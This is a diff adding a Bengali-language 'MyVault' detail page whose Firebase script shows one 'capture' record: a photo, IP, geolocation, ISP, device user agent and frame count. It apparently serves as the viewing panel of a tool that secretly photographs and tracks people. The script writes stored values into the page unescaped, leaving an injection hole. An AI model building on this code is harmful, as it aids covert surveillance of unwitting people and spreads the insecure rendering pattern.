@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>বিস্তারিত — MyVault</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="dash-nav">
+  <div class="dash-brand">
+    <div class="dash-brand-mark">V</div>
+    <div class="dash-brand-info">
+      <div class="bn">MyVault</div>
+      <div class="bs">বিস্তারিত তথ্য</div>
+    </div>
+  </div>
+  <a href="dashboard.html" class="btn-logout" style="text-decoration:none;">← ড্যাশবোর্ড</a>
+</nav>
+
+<div class="dash-wrap" style="max-width:800px;">
+  <div id="content">
+    <div class="loading"><div class="spinner"></div><span>লোড হচ্ছে…</span></div>
+  </div>
+</div>
+
+<script type="module">
+import { db, doc, getDoc, auth, onAuthStateChanged } from "./firebase.js";
+
+const params = new URLSearchParams(location.search);
+const id     = params.get("id");
+const box    = document.getElementById("content");
+
+onAuthStateChanged(auth, async (user) => {
+  if (!user) return location.href = "login.html";
+  if (!id){ box.innerHTML = "<p>ভুল লিংক।</p>"; return; }
+
+  const snap = await getDoc(doc(db, "captures", id));
+  if (!snap.exists()){ box.innerHTML = "<p>পাওয়া যায়নি।</p>"; return; }
+
+  const d = snap.data();
+
+  /* security: only owner can view */
+  if (d.ownerUid !== user.uid){
+    box.innerHTML = "<p style='color:#dc2626;'>আপনার অনুমতি নেই।</p>";
+    return;
+  }
+
+  const date = d.createdAt?.toDate ? d.createdAt.toDate().toLocaleString("bn-BD") : "—";
+
+  box.innerHTML = `
+    <div class="dash-section">
+      <div class="section-head">
+        <h3>📸 ক্যাপচার #${id.substring(0,8)}</h3>
+      </div>
+
+      ${d.photoUrl ? `<img src="${d.photoUrl}" style="width:100%;max-width:400px;border-radius:14px;margin-bottom:20px;display:block;">` : ""}
+
+      <div class="review-item"><span class="k">🕐 সময়</span><span class="v">${date}</span></div>
+      <div class="review-item"><span class="k">🌐 IP</span><span class="v">${d.ip || "—"}</span></div>
+      <div class="review-item"><span class="k">📍 লোকেশন</span><span class="v">${d.geo || "—"}</span></div>
+      <div class="review-item"><span class="k">📡 ISP</span><span class="v">${d.geoISP || "—"}</span></div>
+      <div class="review-item"><span class="k">🏙️ শহর</span><span class="v">${d.geoCity || "—"}</span></div>
+      <div class="review-item"><span class="k">🌍 দেশ</span><span class="v">${d.geoCountry || "—"}</span></div>
+      <div class="review-item"><span class="k">⏰ টাইমজোন</span><span class="v">${d.timezone || "—"}</span></div>
+      <div class="review-item"><span class="k">🗣️ ভাষা</span><span class="v">${d.language || "—"}</span></div>
+      <div class="review-item"><span class="k">📺 স্ক্রিন</span><span class="v">${d.screen || "—"}</span></div>
+      <div class="review-item" style="align-items:flex-start;"><span class="k">💻 ডিভাইস</span><span class="v" style="font-size:12px;text-align:right;max-width:60%;word-break:break-all;">${d.userAgent || "—"}</span></div>
+      <div class="review-item"><span class="k">📊 ফ্রেম</span><span class="v">${d.frameIndex} / ${d.totalFrames}</span></div>
+    </div>
+  `;
+});
+</script>
+
+</body>
+</html>
